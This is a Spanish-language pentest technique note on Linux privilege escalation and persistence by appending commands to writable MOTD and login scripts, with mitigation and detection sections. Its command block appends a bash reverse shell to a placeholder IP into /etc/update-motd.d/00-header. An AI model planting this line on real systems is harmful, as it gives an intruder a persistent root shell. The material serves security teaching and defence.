---
topic: Linux — scripts de login escribibles
tags: [linux, motd, login, persistence, privesc]
---

# Linux — scripts de login escribibles

[🌐 English](login-script-append.en.md) | **Español**

## Concepto

Los scripts de MOTD y de login se ejecutan al abrir una sesión, a menudo como root. Si un usuario puede añadir contenido a uno de ellos, consigue persistencia y ejecución privilegiada sin modificar el archivo completo. Los permisos de grupo o un directorio escribible son suficientes.

## Cuándo aplica

- `/etc/update-motd.d/` o un script de login es escribible por el usuario.
- El script se ejecuta en cada SSH o inicio de sesión.
- Se busca una escalada sencilla desde una cuenta local.

## Procedimiento

1. Listar scripts y permisos de MOTD/login.
2. Comprobar si el usuario puede hacer append.
3. Añadir un comando que lance una shell.
4. Abrir una nueva sesión SSH y verificar el UID.

## Comandos

```bash
ls -la /etc/update-motd.d/
ls -la /etc/profile.d/
echo 'bash -i >& /dev/tcp/<IP>/4444 0>&1' >> /etc/update-motd.d/00-header
ssh <USER>@<HOST>
```

## Variantes

- Editar un script de `profile.d` o `.bashrc` de root.
- Aprovechar un directorio escribible incluido por wildcard.
- Usar un script de PAM o `pam_exec`.

## Limitaciones

- El script puede ejecutarse como el usuario, no como root.
- El archivo puede ser inmutable.
- La sesión debe reiniciarse.

## Mitigación

- Montar scripts de login como solo lectura.
- Auditar permisos de grupo y `sudo` sobre `/etc`.
- Evitar scripts de login que ejecuten contenido editable.

## Detección

- Cambios en scripts de MOTD o `profile.d`.
- Conexiones SSH que lanzan procesos inusuales.
- Archivos con append reciente por usuarios no root.

## Referencias

- [0xdf — Late](https://0xdf.gitlab.io/2022/07/30/htb-late.html)
- [Ubuntu — update-motd](https://manpages.ubuntu.com/manpages/noble/man5/update-motd.5.html)
- [CWE-732 — Incorrect Permission Assignment](https://cwe.mitre.org/data/definitions/732.html)
